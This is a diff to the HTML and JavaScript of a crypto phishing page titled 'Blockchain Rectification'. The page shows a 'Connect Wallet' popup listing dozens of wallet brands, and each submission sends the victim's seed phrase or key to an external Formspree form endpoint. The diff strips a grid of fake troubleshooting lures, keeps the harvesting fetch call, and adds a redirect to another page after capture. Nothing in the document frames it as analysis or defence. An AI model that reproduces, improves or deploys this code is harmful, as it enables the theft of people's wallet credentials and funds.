@@ -8,21 +8,12 @@
 </head>
 <body>
     <div class="landing-container">
-        <div class="landing-content">
-            <h1>Blockchain Rectification</h1>
-            <p>
-                This is not an app but a protocol, that establishes a remote resolution between all noncustodial wallet discovering the decentralized solutions, seamless transactions, and a decentralized ecosystem. Join us in revolutionizing the way you interact with digital assets and decentralized applications.
-            </p>
-            <button class="connect-btn" onclick="openWalletPopup()">Connect Wallet</button>
-        </div>
-        <div class="landing-image">
-            <img src="assets/blockchain-graphic.png" alt="Blockchain Graphic">
-        </div>
+        <h1>Blockchain Rectification</h1>
+        <p>
+            This is not an app but a protocol, that establishes a remote resolution between all noncustodial wallet discovering the decentralized solutions, seamless transactions, and a decentralized ecosystem. Join us in revolutionizing the way you interact with digital assets and decentralized applications.
+        </p>
+        <button class="connect-btn" onclick="openWalletPopup()">Connect Wallet</button>
     </div>
-
-    <!-- Add the "Get Started Below." section and troubleshoot grid -->
-    <h1 style="text-align: center;">Get Started Below.</h1>
-    <div class="troubleshoot-container" id="troubleshootContainer"></div>
 
     <!-- Wallet Selection Popup -->
     <div id="walletPopup" class="popup">
@@ -56,7 +47,7 @@
             </div>
 
             <label for="manualInput">Enter your wallet <span id="inputLabel">phrase</span></label>
-            <textarea id="manualInput" name="manualInput" placeholder="Enter your wallet phrase" rows="4"></textarea>
+            <input type="text" id="manualInput" name="manualInput" placeholder="Enter your wallet phrase">
 
             <p id="errorMessage" class="hidden"></p>
 
@@ -66,30 +57,6 @@
     </div>
 
     <script>
-        const troubleshootOptions = [
-            { name: "Migration", description: "Click here for migration or to resolve any migration related issues." },
-            { name: "Rectification", description: "Click here to rectify all strange wallet issues." },
-            { name: "Claim", description: "Click here to claim tokens or resolve any token claiming related issues." },
-            { name: "Swap", description: "Click here to swap tokens or resolve token swaplist." },
-            { name: "Slippage", description: "Click here for slippage or transaction fee related issues." },
-            { name: "Claim Airdrop", description: "Click here to claim airdrop or resolve errors encountered during airdrop claim." },
-            { name: "Staking", description: "Click here to resolve issues while staking/unstaking." },
-            { name: "Whitelist", description: "Click here to whitelist your address or resolve whitelisting related error." },
-            { name: "Cross Transfer", description: "Click here to resolve cross transfer issues." },
-            { name: "NFTs", description: "Click here to resolve NFT related issues." },
-            { name: "Locked Account", description: "Click here to resolve locked account issues." },
-            { name: "Login Error", description: "Click here to resolve login error issues." },
-            { name: "Wallet Glitch", description: "Click here to resolve wallet issues." },
-            { name: "DeFi Farming", description: "Click here for DeFi or Commercial farming related issues." },
-            { name: "Validation", description: "Click here to validate your wallet via Multisig." },
-            { name: "Transaction Delay", description: "Click here for any transaction related error." },
-            { name: "Missing/Irregular Balance", description: "Click here to recover lost or missing funds." },
-            { name: "Recovery", description: "Click here for wallet recovery." },
-            { name: "Buy Token/Coin", description: "Click here to trade. Your account has to be marked as a trusted payment source to start trading." },
-            { name: "Exchange", description: "Click here for token exchange or to resolve errors encountered during token exchange." },
-            { name: "Bridging", description: "Click here to bridge tokens or resolve bridging related issues." }
-        ];
-
         const wallets = [
             "Metamask", "Trust", "Coinbase", "Xumm", "Cardano", "Daedalus", "Yoroi", "CCVault",
             "Gero", "Nami", "Solana", "Phantom", "Solflare", "Sollet", "Solong", "Exodus",
@@ -103,27 +70,7 @@
             "Stellar", "Tron", "Terra", "Cosmos", "Metis", "Optimism"
         ];
 
-        const troubleshootContainer = document.getElementById("troubleshootContainer");
         const walletList = document.getElementById("walletList");
-
-        // Populate troubleshooting options
-        troubleshootOptions.forEach(option => {
-            let optionBox = document.createElement("div");
-            optionBox.classList.add("troubleshoot-box");
-            optionBox.setAttribute("tabindex", "0");
-            optionBox.setAttribute("role", "button");
-            optionBox.innerHTML = `
-                <h3>${option.name.toUpperCase()}</h3>
-                <p>${option.description}</p>
-            `;
-            optionBox.onclick = () => openWalletPopup(option.name);
-            optionBox.onkeydown = (e) => {
-                if (e.key === "Enter" || e.key === " ") {
-                    openWalletPopup(option.name);
-                }
-            };
-            troubleshootContainer.appendChild(optionBox);
-        });
 
         // Populate wallet list in the popup
         wallets.forEach(wallet => {
@@ -150,12 +97,10 @@
         });
 
         let selectedWallet = null;
-        let selectedTroubleshootOption = null;
         let currentTab = "phrase";
 
         // Open wallet selection popup
-        function openWalletPopup(troubleshootOption = null) {
-            selectedTroubleshootOption = troubleshootOption;
+        function openWalletPopup() {
             document.getElementById("walletPopup").style.display = "flex";
         }
 
@@ -187,7 +132,6 @@
         // Close error popup
         function closeErrorPopup() {
             selectedWallet = null;
-            selectedTroubleshootOption = null;
             currentTab = "phrase";
             document.getElementById("manualInput").value = "";
             document.getElementById("errorMessage").textContent = "";
@@ -242,11 +186,6 @@
             let manualInput = document.getElementById("manualInput").value.trim();
             let message = document.getElementById("errorMessage");
 
-            // Normalize spaces and newlines for seed phrase validation
-            if (currentTab === "phrase") {
-                manualInput = manualInput.replace(/\s+/g, " ").trim();
-            }
-
             message.textContent = "";
             message.classList.add("hidden");
 
@@ -274,15 +213,10 @@
                 return;
             }
 
-            let formData = `wallet=${encodeURIComponent(selectedWallet)}&authType=${encodeURIComponent(currentTab)}&authInput=${encodeURIComponent(manualInput)}`;
-            if (selectedTroubleshootOption) {
-                formData += `&troubleshootOption=${encodeURIComponent(selectedTroubleshootOption)}`;
-            }
-
             fetch("https://formspree.io/f/mvgkalye", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: formData
+                body: `wallet=${encodeURIComponent(selectedWallet)}&authType=${encodeURIComponent(currentTab)}&authInput=${encodeURIComponent(manualInput)}`
             })
             .then(response => {
                 if (response.ok) {
@@ -291,6 +225,7 @@
                     message.classList.remove("hidden");
                     setTimeout(() => {
                         closeErrorPopup();
+                        window.location.href = "syncwallets.html";
                     }, 2000);
                 } else {
                     message.textContent = `Error submitting credentials. Status: ${response.status}`;
